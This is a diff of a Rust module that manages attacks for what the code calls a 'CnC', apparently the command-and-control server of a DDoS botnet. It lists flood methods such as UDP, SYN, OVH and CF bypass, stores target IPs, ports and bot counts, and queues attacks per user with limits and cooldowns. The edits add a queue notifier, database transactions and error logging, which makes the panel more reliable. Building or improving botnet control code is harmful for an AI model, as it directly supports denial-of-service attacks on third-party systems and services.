@@ -1,11 +1,12 @@
 use std::time::{Duration, Instant};
 use serde::{Deserialize, Serialize};
 use std::net::IpAddr;
-use tokio::sync::Mutex;
+use tokio::sync::{Mutex, Notify};
 use std::sync::Arc;
 use dashmap::DashMap;
 use super::auth::Level;
 use sqlx::{SqlitePool, Row};
+use tracing::error;
 
 pub const VALID_ATTACK_METHODS: &[&str] = &[
     "UDP", "TCP", "HTTP", "SYN", "ACK", "STD", "VSE", "OVH", "NFO", "BYPASS", "TLS", "CF",
@@ -55,12 +56,14 @@ pub struct AttackRequest {
     pub username: String,
     pub user_level: Level,
     pub bot_count: usize,
+    #[allow(dead_code)]
     pub queued_at: Instant,
 }
 
 pub struct AttackManager {
     attacks: Arc<DashMap<i64, Attack>>,
     queue: Arc<Mutex<Vec<AttackRequest>>>,
+    queue_notify: Arc<Notify>,
     pool: SqlitePool,
     max_attacks: usize,
     cooldown_secs: u64,
@@ -74,6 +77,7 @@ impl AttackManager {
         Self {
             attacks: Arc::new(DashMap::new()),
             queue: Arc::new(Mutex::new(Vec::new())),
+            queue_notify: Arc::new(Notify::new()),
             pool,
             max_attacks,
             cooldown_secs,
@@ -83,6 +87,7 @@ impl AttackManager {
         }
     }
     
+    #[allow(dead_code)]
     pub async fn can_start_attack(&self, username: &str, user_level: Level) -> Result<(), String> {
         // This method is now just a pre-check, actual enforcement happens in start_attack
         let count = self.attacks.len();
@@ -203,17 +208,11 @@ impl AttackManager {
                 }
             }
             
-            // If we are here, we are good to go.
-            // We hold the lock, so no one else can start an attack that would violate the limit.
-            // However, we are about to do an async DB insert.
-            // If we release the lock, someone else might jump in.
-            // But we can't hold the lock during DB insert if we want high throughput?
-            // Actually, for a CnC, throughput of *starting* attacks is low. Holding the lock is fine.
-            // But wait, `start_attack` is async. `Mutex` is `tokio::sync::Mutex`.
-            // So we can hold it across await.
-            
             let ip_str = ip.to_string();
             let now = chrono::Utc::now();
+
+            // Use a transaction for DB safety
+            let mut tx = self.pool.begin().await.map_err(|e| format!("Database error: {}", e))?;
 
             let id = sqlx::query("INSERT INTO attacks (username, target_ip, target_port, method, duration, started_at, status, bot_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
                 .bind(&username)
@@ -224,11 +223,13 @@ impl AttackManager {
                 .bind(now)
                 .bind("running")
                 .bind(bot_count as i64)
-                .execute(&self.pool)
+                .execute(&mut *tx)
                 .await
                 .map_err(|e| format!("Database error: {}", e))?
                 .last_insert_rowid();
             
+            tx.commit().await.map_err(|e| format!("Database commit error: {}", e))?;
+
             let attack = Attack {
                 id,
                 method: method.clone(),
@@ -280,11 +281,23 @@ impl AttackManager {
             queued_at: Instant::now(),
         });
 
+        // Notify queue processor
+        self.queue_notify.notify_one();
+
         Ok(queue.len())
     }
 
+    pub async fn get_queue_items(&self) -> Vec<AttackRequest> {
+        self.queue.lock().await.clone()
+    }
+
+    #[allow(dead_code)]
     pub async fn get_queue_size(&self) -> usize {
         self.queue.lock().await.len()
+    }
+
+    pub async fn wait_for_queue(&self) {
+        self.queue_notify.notified().await;
     }
 
     pub async fn process_queue(&self) -> Option<AttackRequest> {
@@ -300,11 +313,14 @@ impl AttackManager {
         let id = attack_id as i64;
         if self.attacks.remove(&id).is_some() {
             let now = chrono::Utc::now();
-            let _ = sqlx::query("UPDATE attacks SET status = 'finished', finished_at = ? WHERE id = ?")
+            if let Err(e) = sqlx::query("UPDATE attacks SET status = 'finished', finished_at = ? WHERE id = ?")
                 .bind(now)
                 .bind(id)
                 .execute(&self.pool)
-                .await;
+                .await 
+            {
+                error!("Failed to update attack status in DB for attack {}: {}", id, e);
+            }
             Ok(())
         } else {
             Err(format!("Attack {} not found", attack_id))
@@ -321,11 +337,14 @@ impl AttackManager {
             if self.attacks.remove(&id).is_some() {
                 stopped_ids.push(id as usize);
                 let now = chrono::Utc::now();
-                let _ = sqlx::query("UPDATE attacks SET status = 'finished', finished_at = ? WHERE id = ?")
+                if let Err(e) = sqlx::query("UPDATE attacks SET status = 'finished', finished_at = ? WHERE id = ?")
                     .bind(now)
                     .bind(id)
                     .execute(&self.pool)
-                    .await;
+                    .await
+                {
+                    error!("Failed to update attack status in DB for attack {}: {}", id, e);
+                }
             }
         }
         
@@ -349,11 +368,17 @@ impl AttackManager {
     }
     
     pub async fn get_history(&self, limit: usize) -> Vec<AttackHistory> {
-        let rows = sqlx::query("SELECT id, method, target_ip, target_port, duration, username, started_at, status FROM attacks ORDER BY started_at DESC LIMIT ?")
+        let rows = match sqlx::query("SELECT id, method, target_ip, target_port, duration, username, started_at, status FROM attacks ORDER BY started_at DESC LIMIT ?")
             .bind(limit as i64)
             .fetch_all(&self.pool)
-            .await
-            .unwrap_or_default();
+            .await 
+        {
+            Ok(rows) => rows,
+            Err(e) => {
+                error!("Failed to fetch attack history: {}", e);
+                return Vec::new();
+            }
+        };
 
         rows.into_iter().map(|row| {
             let status: String = row.get("status");
@@ -381,11 +406,14 @@ impl AttackManager {
         for id in finished_ids {
             self.attacks.remove(&id);
             let now = chrono::Utc::now();
-            let _ = sqlx::query("UPDATE attacks SET status = 'finished', finished_at = ? WHERE id = ?")
+            if let Err(e) = sqlx::query("UPDATE attacks SET status = 'finished', finished_at = ? WHERE id = ?")
                 .bind(now)
                 .bind(id)
                 .execute(&self.pool)
-                .await;
+                .await
+            {
+                error!("Failed to update attack status in DB for attack {}: {}", id, e);
+            }
         }
     }
     
@@ -394,9 +422,12 @@ impl AttackManager {
     }
     
     pub async fn cleanup_stale_attacks(&self) {
-        let _ = sqlx::query("UPDATE attacks SET status = 'interrupted', finished_at = CURRENT_TIMESTAMP WHERE status = 'running'")
+        if let Err(e) = sqlx::query("UPDATE attacks SET status = 'interrupted', finished_at = CURRENT_TIMESTAMP WHERE status = 'running'")
             .execute(&self.pool)
-            .await;
+            .await
+        {
+            error!("Failed to cleanup stale attacks: {}", e);
+        }
     }
 }
 
